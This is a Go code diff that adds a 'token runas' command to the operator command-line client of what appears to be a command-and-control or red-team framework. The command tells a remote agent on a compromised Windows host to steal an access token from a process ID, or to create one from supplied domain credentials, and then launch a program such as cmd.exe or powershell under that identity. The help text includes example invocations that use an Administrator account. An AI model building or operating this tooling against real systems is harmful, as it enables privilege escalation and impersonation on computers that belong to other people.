@@ -172,6 +172,74 @@ Examples:
 	},
 }
 
+// token runas <agent-id> <exe> --pid <pid> | --user <u> --pass <p>
+var tokenRunasCmd = &cobra.Command{
+	Use:   "runas <agent-id> <exe>",
+	Short: "Spawn a process under a stolen or created token",
+	Long: `Steal a token from a PID (or create one via LogonUser) then spawn <exe> under it.
+
+Examples:
+  token runas 7d019eb7 cmd.exe --pid 524 --args "/c whoami /all"
+  token runas 7d019eb7 powershell.exe --user Administrator --domain CORP --pass "P@ss" --wait`,
+	Args: cobra.ExactArgs(2),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID, err := resolveAgentID(args[0])
+		if err != nil {
+			printError(err.Error())
+			os.Exit(1)
+		}
+		exe := args[1]
+		pid, _ := cmd.Flags().GetUint32("pid")
+		runaArgs, _ := cmd.Flags().GetString("args")
+		user, _ := cmd.Flags().GetString("user")
+		domain, _ := cmd.Flags().GetString("domain")
+		pass, _ := cmd.Flags().GetString("pass")
+		wait, _ := cmd.Flags().GetBool("wait")
+		timeout, _ := cmd.Flags().GetInt("timeout")
+
+		if pid == 0 && user == "" {
+			printError("either --pid or --user/--pass is required")
+			os.Exit(1)
+		}
+
+		payload, _ := json.Marshal(map[string]interface{}{
+			"exe":    exe,
+			"args":   runaArgs,
+			"pid":    pid,
+			"user":   user,
+			"domain": domain,
+			"pass":   pass,
+		})
+		body, err := makeAPIRequestWithMethod("POST",
+			"/api/v1/agent/"+agentID+"/token/runas",
+			bytes.NewBuffer(payload), "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("Token runas failed: %v", err))
+			os.Exit(1)
+		}
+		var resp APIResponse
+		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
+			msg := "unknown error"
+			if resp.Error != "" {
+				msg = resp.Error
+			}
+			printError(fmt.Sprintf("Token runas failed: %s", msg))
+			os.Exit(1)
+		}
+		dataMap, _ := resp.Data.(map[string]interface{})
+		cmdID, _ := dataMap["command_id"].(string)
+		printSuccess(fmt.Sprintf("Token runas queued: %s", exe))
+
+		if wait && cmdID != "" {
+			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
+				displayFinalCommandStatus(finalData, cmdID)
+			}
+		} else if cmdID != "" {
+			printInfo(fmt.Sprintf("command_id: %s", cmdID))
+		}
+	},
+}
+
 // token revert <agent-id>
 var tokenRevertCmd = &cobra.Command{
 	Use:   "revert <agent-id>",
